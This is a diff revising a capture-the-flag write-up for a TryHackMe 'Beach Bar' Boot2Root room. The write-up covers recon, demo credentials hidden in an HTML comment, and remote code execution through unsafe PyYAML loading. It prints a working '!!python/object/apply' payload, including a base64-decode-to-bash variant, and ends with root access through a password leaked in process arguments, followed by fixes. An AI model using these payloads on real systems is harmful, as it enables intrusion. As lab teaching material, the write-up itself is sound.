@@ -1,81 +1,33 @@
 # Hacker Holidays: Day 5 - Beach Bar
 
-> 📝 **Write-up credit:** Based on the English write-up by [`shelvy1337` (Cybersecurity-Writeups)](https://github.com/shelvy1337/Cybersecurity-Writeups/tree/main/TryHackMe/Hacker%20Holidays%202026) and used with attribution per that repository's terms. Flag values are censored as `THM{REDACTED}` per this repository's convention.
+**Category:** Boot2Root
+**Difficulty:** Easy
+
+## 🛎️ Concierge Briefing
+> The Beach Bar's jukebox accepts more than song titles. Playlists are parsed as YAML — and the parser is feeling generous. Meanwhile, something root-owned is shouting its password to anyone who runs `ps`.
 
 ---
 
-> Beach Bar is a classic Boot2Root challenge: initial access through a web application, RCE through unsafe YAML parsing, and privilege escalation through a credential leaked in the arguments of a root-owned process.
-
-## Quick Overview
-
-| Field | Value |
-| --- | --- |
-| Platform | TryHackMe |
-| Event | Hacker Holidays 2026 |
-| Day | 5 |
-| Category | Boot2Root |
-| Difficulty | Easy |
-| Techniques | Web, PyYAML Deserialization, RCE, Linux PrivEsc, Credential Reuse |
-| Target | `http://MACHINE_IP` |
-
-## Objective
-
-The goal was to capture two flags:
-
-- user flag
-- root flag
-
-The room description hinted at a jukebox that accepted more than just song titles. That pointed toward the playlist import feature and unsafe YAML parsing.
-
-## Attack Path
-
-1. I performed port reconnaissance.
-2. I found a Flask/Gunicorn web app on port `80`.
-3. I found demo credentials `dj:dj` in an HTML comment on the login page.
-4. After logging in, I inspected `/dashboard`, `/import`, and `/export`.
-5. I exploited unsafe YAML deserialization in the playlist import feature.
-6. I obtained RCE as the `bartender` user.
-7. I read the user flag.
-8. I found a root-owned `jukeboxd` process leaking a password in its arguments.
-9. The same password worked for `su root`.
-10. I read the root flag.
-
-## Recon
-
-The port scan showed only SSH and HTTP:
+## 🕵️‍♂️ Recon
 
 ```bash
-nmap -sV -sC -T4 -oN nmap.txt MACHINE_IP
+nmap -sV -sC -T4 MACHINE_IP
 ```
-
-Important results:
 
 ```text
 22/tcp open  ssh
 80/tcp open  http    gunicorn
 ```
 
-The root page redirected to `/login`, and `gobuster` found a few useful paths:
-
-```bash
-gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
-```
-
-Result:
+A Flask/Gunicorn app on port 80, with the root page redirecting to `/login`. `gobuster` surfaces the app structure:
 
 ```text
-/dashboard
-/export
-/import
-/login
-/logout
+/dashboard   /export   /import   /login   /logout
 ```
 
-Most endpoints required a session, so the next step was to inspect the login page.
+## 🎟️ Demo Credentials
 
-## Login
-
-The `/login` HTML contained a staff comment:
+The `/login` page source hides a staff note:
 
 ```html
 <!--
@@ -84,66 +36,44 @@ The `/login` HTML contained a staff comment:
 -->
 ```
 
-Use the demo credentials:
+`dj:dj` it is:
 
 ```bash
-curl -s -i -c cookies.txt -b cookies.txt \
-  -X POST http://MACHINE_IP/login \
-  -d 'username=dj&password=dj'
+curl -s -i -c c.txt -b c.txt -X POST http://MACHINE_IP/login -d 'username=dj&password=dj'
 ```
 
-After authentication, `/dashboard`, `/import`, and `/export` became available.
+## 🎛️ The Playlist Import
 
-## Playlist Import
-
-The `/export` endpoint returned a sample YAML playlist. The next logical target was `/import`, which accepted a playlist and rendered the parsed structure back in the response.
-
-Example benign YAML:
-
-```yaml
-playlist:
-  name: test
-  tracks:
-    - artist: A
-      title: B
-```
-
-The app reflected the server-side parsed structure, suggesting that YAML was being deserialized and rendered back to the page.
-
-After obtaining RCE, the source confirmed the vulnerable sink:
+`/export` hands back a sample YAML playlist. `/import` takes one and reflects the parsed structure in the response — a strong sign of server-side YAML deserialization. After getting RCE, the source confirms the sink:
 
 ```python
 parsed = yaml.load(content, Loader=yaml.Loader)
 ```
 
-This is unsafe for user-controlled input.
+`yaml.load` with the default `Loader` on user input is game over in one line.
 
-## RCE With PyYAML
+## 💥 RCE via PyYAML
 
-PyYAML with `yaml.Loader` supports Python tags such as `!!python/object/apply`. That allows code execution while parsing YAML.
-
-Minimal test:
+PyYAML's `yaml.Loader` honors Python tags, so I used `!!python/object/apply` to run code during parsing:
 
 ```bash
-curl -s -b cookies.txt -X POST http://MACHINE_IP/import \
+curl -s -b c.txt -X POST http://MACHINE_IP/import \
   --data-urlencode 'playlist=!!python/object/apply:subprocess.check_output [["id"]]'
 ```
 
-The response confirmed command execution as `bartender`:
+The response confirms execution as `bartender`:
 
 ```text
 uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)
 ```
 
-For longer commands, Base64 helps avoid quoting issues:
+For longer commands, base64 avoids quoting issues:
 
 ```yaml
-!!python/object/apply:subprocess.check_output [["bash","-c","echo <base64_command> | base64 -d | bash"]]
+!!python/object/apply:subprocess.check_output [["bash","-c","echo <b64> | base64 -d | bash"]]
 ```
 
-## User Flag
-
-With RCE, the user flag can be read directly:
+## 🚩 User Flag
 
 ```bash
 cat /home/bartender/user.txt
@@ -151,51 +81,29 @@ cat /home/bartender/user.txt
 
 **Flag:** `THM{REDACTED}`
 
-## Privilege Escalation
+## 👑 Privilege Escalation
 
-During process enumeration, a root-owned `jukeboxd` process stood out:
+Process enumeration shows a root-owned jukebox daemon with an interesting command line:
 
 ```bash
 ps auxf
 ```
 
-Key line:
-
 ```text
-root ... /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
+root ... /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass <REDACTED> --bitrate 320k
 ```
 
-The `jukeboxd.py` script required a `--stream-pass` argument, but did not meaningfully use it:
-
-```python
-parser.add_argument("--stream-pass", required=True, help="stream backend password")
-```
-
-The secret was passed as a process argument, and process arguments are visible to local users through `ps` and `/proc`.
-
-The password:
-
-```text
-SunsetSpritz2024!
-```
-
-was also reused as the `root` password.
-
-Validation:
+The `--stream-pass` secret was passed as a process argument — visible to any local user through `ps` or `/proc`. And that same value turns out to be the `root` password:
 
 ```bash
 su - root
 ```
 
-After entering the password, we get root:
-
 ```text
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-## Root Flag
-
-As root, read:
+## 🚩 Root Flag
 
 ```bash
 cat /root/root.txt
@@ -203,24 +111,23 @@ cat /root/root.txt
 
 **Flag:** `THM{REDACTED}`
 
-## Why It Works
+## 💡 Why This Works
 
-The first issue is unsafe YAML deserialization. The application accepted a playlist from the user and parsed it with `yaml.load(..., Loader=yaml.Loader)`, allowing Python objects and function calls to be constructed during parsing. In practice, that gave RCE as the application user.
+Two classic flaws chained together:
 
-The second issue is credential disclosure. The `--stream-pass` value was visible in the command line of a root-owned process. That secret was also reused as the root password, so a simple process argument leak became full system compromise.
+1. **Unsafe deserialization** — `yaml.load(..., Loader=yaml.Loader)` constructs Python objects from attacker input, giving RCE as the application user.
+2. **Credential disclosure + reuse** — a secret on the command line of a root-owned process, reused as the root password. A single `ps auxf` becomes full system compromise.
 
-## How To Fix It
+## 🛡️ Fixes
 
-- Do not use `yaml.load()` on user-controlled input.
-- Replace it with `yaml.safe_load()` or a schema-validated format.
-- Remove demo accounts such as `dj:dj` from production.
-- Do not hard-code a static Flask `secret_key`.
-- Do not pass secrets as process arguments.
-- Do not reuse the same password across different contexts.
-- Run services with least privilege instead of root.
+- Use `yaml.safe_load()` (or schema validation), never `yaml.load` on user input
+- Remove demo accounts like `dj:dj` from production
+- Never pass secrets as process arguments — use env files with restricted permissions
+- Don't reuse the same password across user/root contexts
+- Run services as least privilege, not root
 
-## Summary
+## 📝 Final Thoughts
 
-Day 5 of Hacker Holidays 2026 combines a web vulnerability with a classic Linux privilege escalation. First, we log in with demo credentials, exploit the unsafe PyYAML loader in the playlist import feature, gain RCE as `bartender`, and then find the root password leaked in the arguments of the `jukeboxd` process.
+A clean Boot2Root sandwich: demo credentials → unsafe YAML → RCE as `bartender` → leaked argv password → root. Both flags in about twenty minutes.
 
-The core idea: `dj:dj`, `/import`, `yaml.load`, RCE as `bartender`, `ps auxf`, `SunsetSpritz2024!`, `su root`.
+**Documented and tested for TryHackMe — Hacker Holidays 2026**
